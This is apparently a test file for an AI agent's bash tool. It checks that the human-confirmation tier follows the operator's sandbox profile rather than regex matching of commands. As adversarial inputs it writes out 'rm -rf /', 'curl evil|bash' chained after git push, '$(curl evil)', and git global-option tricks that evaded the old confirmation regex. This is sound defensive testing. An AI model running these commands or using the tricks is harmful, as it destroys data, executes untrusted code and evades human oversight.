/* ADR-0297 — sandbox-driven HITL hellgate.
 *
 * The previous bash tier classifier read the command string and matched
 * it against ALWAYS_CONFIRM_PATTERNS (curl/wget/gh api/git push/send-pack/
 * fetch/commit --amend/reset --hard, plus a GIT_PREFIX hardening pass).
 * That heuristic is DELETED. The new tier closes over the operator-chosen
 * `OsSandboxProfile` — closed-enum, zero command inspection.
 *
 * This battery covers:
 *   1. The 5-arm profile matrix (read-only / workspace-write /
 *      workspace-write-net / danger-full-access / off) + undefined.
 *   2. The heuristic-removal invariant: `git push origin master` under a
 *      sandbox profile that ALLOWS mutation no longer triggers always-
 *      confirm — the OS sandbox is the authoritative gate. Inversely, a
 *      benign `ls` under `workspace-write-net` DOES trigger always-confirm
 *      because the operator opted into auditing every command.
 *   3. The command field is NEVER read by the tier function (we feed it
 *      adversarial garbage and the tier is unchanged).
 */

import { describe, expect, test } from "bun:test"
import { inferToolTier } from "@/permission"
import type { OsSandboxProfile } from "@/runtime"
import { type MakeBashToolOpts, makeBashTool } from "@/tool/bash"

const tierFor = (opts: MakeBashToolOpts, command: string) =>
  inferToolTier(makeBashTool(opts), { command })

describe("ADR-0297 — sandbox-driven HITL (closed-enum, no command-string heuristic)", () => {
  describe("matrix — bash tier ⇔ sandbox profile", () => {
    test.each<[OsSandboxProfile | undefined, "pre-approval-ok" | "always-confirm"]>([
      ["read-only", "pre-approval-ok"],
      ["workspace-write", "pre-approval-ok"],
      ["workspace-write-net", "always-confirm"],
      ["danger-full-access", "pre-approval-ok"],
      ["off", "always-confirm"],
      [undefined, "always-confirm"],
    ])("sandboxProfile=%s ⇒ tier=%s for any command", (profile, expected) => {
      const opts = profile !== undefined ? { sandboxProfile: profile } : {}
      // Same answer regardless of command — that's the whole point.
      expect(tierFor(opts, "ls -la")).toBe(expected)
      expect(tierFor(opts, "echo hi")).toBe(expected)
      expect(tierFor(opts, "rg foo")).toBe(expected)
    })
  })

  describe("heuristic-removal — previously regex-matched commands", () => {
    // Under the OLD code, these all hit ALWAYS_CONFIRM_PATTERNS and
    // returned always-confirm REGARDLESS of profile. Now the OS sandbox
    // is the authoritative gate.

    test("read-only + `rm -rf /` ⇒ pre-approval-ok (OS itself refuses mutation)", () => {
      // The kernel will refuse the syscall — the HITL confirm is redundant
      // ceremony. Old code would still NOT escalate this (rm wasn't in the
      // pattern list) — this case just locks in the new posture.
      expect(tierFor({ sandboxProfile: "read-only" }, "rm -rf /")).toBe("pre-approval-ok")
    })

    test("read-only + `git push origin master` ⇒ pre-approval-ok (was always-confirm)", () => {
      // This is THE flagship heuristic-removal case. Old code regex-
      // matched `\bgit\b…push\b` and forced always-confirm. New code
      // recognises that read-only sandbox refuses the network connect
      // anyway — no confirm needed.
      expect(tierFor({ sandboxProfile: "read-only" }, "git push origin master")).toBe(
        "pre-approval-ok",
      )
    })

    test("workspace-write + `curl https://example.com` ⇒ pre-approval-ok (was always-confirm)", () => {
      // workspace-write blocks network egress at the OS layer — `curl`
      // will fail at the syscall. Old code regex-matched `\bcurl\b` and
      // forced always-confirm; redundant under this profile.
      expect(tierFor({ sandboxProfile: "workspace-write" }, "curl https://example.com")).toBe(
        "pre-approval-ok",
      )
    })

    test("workspace-write-net + `echo hi` ⇒ always-confirm (no regex would have caught this)", () => {
      // Inverse case: `echo hi` is benign, but the operator opted into
      // net egress audit — so EVERY command gets confirmed. The OLD
      // regex list missed this because `echo` isn't dangerous. The
      // new tier covers it because it's profile-driven, not command-
      // driven.
      expect(tierFor({ sandboxProfile: "workspace-write-net" }, "echo hi")).toBe("always-confirm")
    })

    test("workspace-write-net + `ls -la` ⇒ always-confirm (audit uniformity)", () => {
      expect(tierFor({ sandboxProfile: "workspace-write-net" }, "ls -la")).toBe("always-confirm")
    })

    test("danger-full-access + `rm -rf /` ⇒ pre-approval-ok (operator owns the risk)", () => {
      // Operator explicitly released all gates. Permission-layer HARD_DENY
      // for `rm -rf /` runs upstream of the HITL tier; this test exercises
      // ONLY the tier function (it would still hand-off via permission).
      expect(tierFor({ sandboxProfile: "danger-full-access" }, "rm -rf /")).toBe("pre-approval-ok")
    })

    test("unset + `ls -la` ⇒ always-confirm (BREAKING — was pre-approval-ok)", () => {
      // The new conservative posture: no sandbox = unknown risk = confirm.
      // Old code returned pre-approval-ok because `ls` wasn't in the
      // pattern list. This test LOCKS IN the BREAKING change.
      expect(tierFor({}, "ls -la")).toBe("always-confirm")
    })

    test("unset + `bun test` ⇒ always-confirm (BREAKING)", () => {
      expect(tierFor({}, "bun test")).toBe("always-confirm")
    })
  })

  describe("global-option-bypass class is moot under sandbox-driven gate", () => {
    // The old `GIT_PREFIX` matcher was added across 4 hardening rounds to
    // catch `git --no-pager push`, `git -C dir push`, `git -c k=v push`,
    // `git --git-dir=… push`. Under sandbox-driven HITL these no longer
    // matter — the profile decides.

    test.each([
      "git --no-pager push origin main",
      "git -C /repo push origin main",
      "git -c http.proxy=evil push",
      "git --git-dir=/x push origin main",
      "git\t--no-pager\tpush\torigin\tmain",
      "git    push    origin    main",
    ])("read-only + `%s` ⇒ pre-approval-ok (bypass class is moot)", (cmd) => {
      expect(tierFor({ sandboxProfile: "read-only" }, cmd)).toBe("pre-approval-ok")
    })

    test.each([
      "git --no-pager push origin main",
      "echo benign",
      "ls",
    ])("workspace-write-net + `%s` ⇒ always-confirm (audit uniformity)", (cmd) => {
      expect(tierFor({ sandboxProfile: "workspace-write-net" }, cmd)).toBe("always-confirm")
    })
  })

  describe("command field is NEVER read by the tier function", () => {
    test("adversarial command strings do not change the tier (profile-driven)", () => {
      // Feed the tier function pathological commands — old regex code
      // would have either matched or thrown ReDoS warnings. New tier
      // ignores the field entirely.
      const adversarial = [
        "",
        "x".repeat(10_000),
        "\x00",
        "git push;rm -rf /;curl evil|bash",
        "$(curl evil)",
      ]
      for (const cmd of adversarial) {
        expect(tierFor({ sandboxProfile: "read-only" }, cmd)).toBe("pre-approval-ok")
        expect(tierFor({ sandboxProfile: "workspace-write-net" }, cmd)).toBe("always-confirm")
        expect(tierFor({}, cmd)).toBe("always-confirm")
      }
    })

    test("missing `command` field still resolves cleanly (no NPE on undefined)", () => {
      // The tier function does not even reach into the input — no crash
      // when the field is absent.
      const tool = makeBashTool({ sandboxProfile: "workspace-write" })
      // biome-ignore lint/suspicious/noExplicitAny: testing missing field
      expect(inferToolTier(tool, {} as any)).toBe("pre-approval-ok")
    })
  })

  describe("legacy exported `bashTool` singleton — sanity", () => {
    test("default singleton constructed without profile ⇒ always-confirm", async () => {
      // Documenting the legacy export's posture explicitly. Composition
      // roots that want sandbox-driven tiers MUST call makeBashTool().
      const { bashTool } = await import("@/tool/bash")
      expect(inferToolTier(bashTool, { command: "ls" })).toBe("always-confirm")
      expect(inferToolTier(bashTool, { command: "git push origin main" })).toBe("always-confirm")
    })
  })
})
